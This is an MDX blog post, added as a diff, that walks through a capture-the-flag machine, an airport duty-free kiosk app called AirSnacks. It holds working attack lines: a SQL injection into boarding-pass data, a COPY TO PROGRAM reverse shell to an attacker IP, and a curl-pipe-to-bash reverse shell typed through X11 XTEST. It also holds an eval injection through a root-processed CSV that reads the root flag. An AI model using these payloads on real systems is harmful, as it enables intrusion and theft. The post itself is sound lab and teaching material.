@@ -1,0 +1,294 @@
+import Bild from "../../components/Bild.astro";
+import Code from "../../components/Code.astro";
+import Block from "../../components/Block.astro";
+import Marker from "../../components/Marker.astro";
+
+**Disclaimer**: The steps for this writeup are based on my notes and memory, so they might not be 100% accurate. Additionally, I have changed the flags for this writeup, so they won't match the ones on the machine.
+
+Starting with a full TCP port scan and then running service detection against the discovered ports reveals three open ports:
+
+<Block
+  language="Text"
+  content={
+    "22/tcp  - SSH (OpenSSH 8.9p1 Ubuntu)\n80/tcp  - HTTP (nginx 1.18)\n443/tcp - HTTPS (nginx 1.18)"
+  }
+/>
+
+The web server on port <Code content="80" /> redirects to <Code content="https://airsnacks.htb/" />. After adding the hostname to my local hosts file, I opened the website.
+
+The application is called AirSnacks and presents itself as a self-checkout system for airport duty-free shopping. The initial page is essentially a kiosk greeter, allowing customers to start their shopping session.
+
+<Bild
+  src={"/images/writeups/dutybound-greeter.png"}
+  alt={"AirSnacks self-checkout greeter page"}
+  width={1920}
+  height={1080}
+/>
+
+After entering the application, I could browse the available products and add items to my cart. Nothing particularly interesting stood out in the frontend itself, but I started inspecting the requests being sent to the backend.
+
+<Bild
+  src={"/images/writeups/dutybound-browsing.png"}
+  alt={"AirSnacks product browsing page showing available items"}
+  width={1920}
+  height={1080}
+/>
+
+One of the interesting parts of the application was the checkout process. Instead of a conventional checkout, the kiosk required a boarding pass to be scanned before proceeding.
+
+<Bild
+  src={"/images/writeups/dutybound-boarding.png"}
+  alt={"AirSnacks boarding-pass scanning interface"}
+  width={1920}
+  height={1080}
+/>
+
+Looking at the requests while capturing with burpsuite, I found the endpoint responsible for verifying boarding passes:
+
+<Block language="Text" content={"POST /checkout/boarding-pass/verify"} />
+
+The endpoint accepted a JSON body containing a field named <Code content="raw" />, which held the raw boarding-pass data. This was particularly interesting because the backend had to parse and validate the supplied string.
+
+I spent some time looking into the BCBP (Bar Coded Boarding Pass) format to understand how the application expected the data to be structured. The format consists of fixed-width fields followed by conditional data. But to be honest, I made AI create me a valid BCBP because this was more of an iterative process while the application threw errors at me, I threw them back at ChatGPT and sooner or later he fetched me a valid BCBP.
+
+At this point I was kinda stuck so I had to get some help by <Marker content="lanky" link="https://lankylukeaus.github.io"/>. He stated that in the conditional data-part of the BCBP it is possible to insert SQL-statements. I took his python script, which constructed a boarding pass and sent it to the verification endpoint:
+
+<Block
+  language="Python"
+  content={
+    'import requests\n\nBASE = "https://airsnacks.htb"\n\n# Construct the fixed-width BCBP fields\nfixed = (\n    f"M1{\'TEST/USER\':<20}E{\'ABC123\':<7}"\n    f"{\'LHR\':<3}{\'JFK\':<3}{\'BA\':<3}{\'0123\':<5}"\n    f"298Y{\'012A\':<4}{\'0001A\':<5}1"\n)\n\nconditional = ">70B0WW6298BBA 03125"\nraw = fixed + f"{len(conditional):02X}" + conditional\n\nsession = requests.Session()\nsession.verify = False\n\nsession.post(BASE + "/cart/add", json={"sku": "SNK-CRN"})\nresponse = session.post(\n    BASE + "/checkout/boarding-pass/verify",\n    json={"raw": raw}\n)\nprint(response.status_code, response.text)'
+  }
+/>
+
+By injecting an expression that attempted to convert the current database user to an integer, I could make PostgreSQL return an error containing the actual username:
+
+<Block
+  language="Text"
+  content={
+    `"'||(SELECT current_user)::int||'"`
+  }
+/>
+
+The response disclosed the database role <Code content="airsnacks_app" />. This confirmed that the application was using PostgreSQL.
+
+Lanky also stated that the <Code content="airsnacks_app" /> user was able to execute <Code content="COPY ... TO PROGRAM"/> statement, which makes it possible to create a reverse shell:
+
+<Block
+  language="SQL"
+  content={
+    `'); COPY (SELECT 'x') TO PROGRAM 'bash -i >& /dev/tcp/10.10.14.215/4444 0>&1 &';--`
+  }
+/>
+
+And god damn lanky was right. So from know on, I proceed on my own. But thank you lanky, wouldn't have gotten the initial foothold without you.
+
+One important distinction here: the database role was <Code content="airsnacks_app" />, but the operating-system command was executed as <Code content="postgres" />. Database privileges and Linux user privileges are two different things. I started enumerating the machine.
+
+I listed services <Code content="systemctl list-units --all" />, found something interesting. A CSV-file which is read by a root-executed script, and the <Code content="dutyfree-kiosk"/> user was in a group which can edit the CSV-file. But that's a problem for later.
+
+I came across kiosk-related processes and noticed that a graphical desktop environment was running under <Code content="dutyfree-kiosk" />. The process list revealed that the userwas running an X server, Openbox, and Firefox in kiosk mode:
+
+<Block
+  language="Text"
+  content={
+    "dutyfree-kiosk ... /usr/bin/startx\n" +
+    "dutyfree-kiosk ... xinit /home/dutyfree-kiosk/.xinitrc\n" +
+    "root           ... /usr/lib/xorg/Xorg :0\n" +
+    "dutyfree-kiosk ... /usr/bin/openbox\n" +
+    "dutyfree-kiosk ... firefox --kiosk https://airsnacks.htb"
+  }
+/>
+
+Initially, I could not access the user's home directory or inspect the Firefox process directly. However, I noticed that the X11 socket was accessible:
+
+<Block language="Bash" content={"xset -display :0 q"} />
+
+This command worked without requiring the X11 authentication cookie. In other words, my current user could communicate with the graphical session running on display <Code content=":0" />.
+
+I then inspected the window tree using <Code content="xwininfo" />. This confirmed that the Firefox kiosk window and other Openbox windows were accessible through the display.
+
+The next important discovery was the system-wide Openbox configuration. It contained a keyboard shortcut that opened an xterm:
+
+<Block
+  language="XML"
+  content={
+    '<keybind key="C-A-t">\n  <action name="Execute">\n    <command>xterm</command>\n  </action>\n</keybind>'
+  }
+/>
+
+Since I could communicate with the X server, I looked into whether I could simulate keyboard input. The Python Xlib library provides an XTEST extension that allows applications to generate synthetic keyboard and mouse events.
+
+I used it to send the <Code content="Ctrl+Alt+T" /> shortcut to the graphical session. This opened an xterm window running as <Code content="dutyfree-kiosk" />. I confirmed that it's running by doing <Code content="xwininfo"/> once again. It's running. Really.
+
+I then used XTEST again to type a reverse-shell command into the newly opened terminal. Basically a curl for an script that establishes a reverse shell with my machine:
+
+<Block
+  language="Bash"
+  content={
+    "curl http://10.10.14.215/rev.sh | bash"
+  }
+/>
+
+And it worked! This gave me a second shell, this time as <Code content="dutyfree-kiosk" />.
+
+The interesting part about this technique is that I did not need to read the user's X11 authentication cookie or access their home directory. The X server itself accepted my connection, and the existing Openbox configuration provided a way to launch a terminal in the context of the logged-in user.
+
+With access as <Code content="dutyfree-kiosk" /> I went back to the CSV-file situation. Which seems so promising.
+
+<Block
+  language="Text"
+  content={
+    "/opt/vrs/\n" +
+    "├── bin/\n" +
+    "│   ├── apply-duty-rates.sh\n" +
+    "│   └── vrs-dcs-sync.cron\n" +
+    "└── data/\n" +
+    "    └── duty-rates.csv"
+  }
+/>
+
+So as I said, the CSV-file has very interesting permissions. It was owned by root and group-writable by members of <Code content="pos-ops"/>.
+
+<Block
+  language="Bash"
+  content={
+    "ls -l /opt/vrs/data/duty-rates.csv"
+  }
+/>
+
+<Block
+  language="Text"
+  content={
+    "-rw-rw-r-- 1 root pos-ops 97 Aug 26 14:21 /opt/vrs/data/duty-rates.csv"
+  }
+/>
+
+Since <Code content="dutyfree-kiosk" /> was a member of that group, I could modify it.
+
+I then inspected the script responsible for applying the duty rates:
+
+<Block
+  language="Bash"
+  content={
+    "cat /opt/vrs/bin/apply-duty-rates.sh"
+  }
+/>
+
+The script validated the CSV fields and checked that the duty and VAT percentages were numeric. However, one line stood out:
+
+<Block
+  language="Bash"
+  content={
+    'eval "${tax_class}=${duty_pct}"'
+  }
+/>
+
+The script used <Code content="eval" /> to construct and execute a shell command from the first CSV column. Unlike the percentage fields, the tax class was not validated or sanitized.
+
+This meant that I could inject shell syntax through the CSV file. For example, a value such as:
+
+<Block
+  language="Text"
+  content={
+    "SPIRITS=45;touch /tmp/vrs-rooted;#"
+  }
+/>
+
+would result in the following command being evaluated:
+
+<Block
+  language="Bash"
+  content={
+    'eval "SPIRITS=45;touch /tmp/vrs-rooted;#=20"'
+  }
+/>
+
+The first part performs a normal variable assignment, the second executes my command, and the final part is commented out. This was especially useful because the script still received a valid assignment for the required <Code content="SPIRITS" /> category.
+
+However, simply finding an unsafe script was not enough. I still needed to establish whether it was executed with elevated privileges.
+
+I searched for references to the script throughout the system:
+
+<Block
+  language="Bash"
+  content={
+    'grep -R "apply-duty-rates" /etc/cron* /etc/systemd /opt/vrs /usr/local/bin 2>/dev/null'
+  }
+/>
+
+This revealed a systemd service:
+
+<Block
+  language="Text"
+  content={
+    "[Service]\n" +
+    "Type=oneshot\n" +
+    "EnvironmentFile=/etc/airsnacksdf/db.env\n" +
+    "ExecStart=/opt/vrs/bin/apply-duty-rates.sh"
+  }
+/>
+
+The service did not specify a <Code content="User=" /> directive. Since systemd services run as root by default when no user is specified, this meant the script was executed with root privileges.
+
+But there was one more piece to the puzzle. The service itself was not necessarily running continuously. I needed to figure out what triggered it.
+
+Looking through the systemd units revealed another unit named <Code content="vrs-duty-apply.path" />:
+
+<Block
+  language="Text"
+  content={
+    "[Path]\n" +
+    "PathModified=/opt/vrs/data/duty-rates.csv\n" +
+    "Unit=vrs-duty-apply.service"
+  }
+/>
+
+This was the missing link. The path unit monitored <Code content="duty-rates.csv" /> for modifications and started the service whenever the file changed.
+
+So the entire privilege-escalation path was now clear:
+
+1. I could modify the CSV as <Code content="dutyfree-kiosk" />.
+2. The systemd path unit detected the modification.
+3. Systemd started the service.
+4. The service executed the vulnerable script as root.
+5. The script evaluated my injected shell command through <Code content="eval" />.
+
+Before going for the actual root flag, I tested the injection with a harmless command, just to tease the privilege escalation:
+
+<Block
+  language="Text"
+  content={
+    "SPIRITS=45;touch /tmp/vrs-rooted;#,20,20"
+  }
+/>
+
+After modifying the CSV, I checked <Code content="/tmp" /> and found the marker file. This confirmed that my injected command had executed.
+
+With that confirmed, retrieving the root flag was straightforward. I replaced the marker command with a command that copied the root flag into a location accessible to my current user:
+
+<Block
+  language="Text"
+  content={
+    "SPIRITS=45;cat /root/root.txt > /tmp/root.txt;#,20,20\n" +
+    "WINE,25,20\n" +
+    "BEER,25,20\n" +
+    "SOFT_DRINKS,20,20\n" +
+    "SNACKS,20,20\n" +
+    "CONFECTIONERY,20,20\n" +
+    "WATER,0,0"
+  }
+/>
+
+After the path unit triggered the service, I could simply read the copied flag:
+
+<Block language="Bash" content={"cat /tmp/root.txt"} />
+
+And there was the root flag.
+
+**SQL injection can lead to operating-system command execution**: The vulnerable boarding-pass verification endpoint allowed me to inject SQL into a PostgreSQL query. The database role also had access to <Code content="pg_execute_server_program" />, which made it possible to execute commands through <Code content="COPY ... TO PROGRAM" />.
+
+**An X11 display can be an interesting attack surface**: Even without access to the user's home directory or authentication cookie, I could connect to the running X server. Combined with XTEST and an existing Openbox keyboard shortcut, this allowed me to open a terminal as another user.
+
+**Never use eval on untrusted input**: The script validated the numeric fields but completely trusted the tax-class field. Passing that field directly to <Code content="eval" /> turned a CSV value into executable shell syntax. This was the actual root vulnerability.
+
+**Systemd path units are worth enumerating**: The service was not running continuously, and simply looking at active services would not have revealed the whole picture. The path unit explained exactly how a file modification triggered privileged execution.
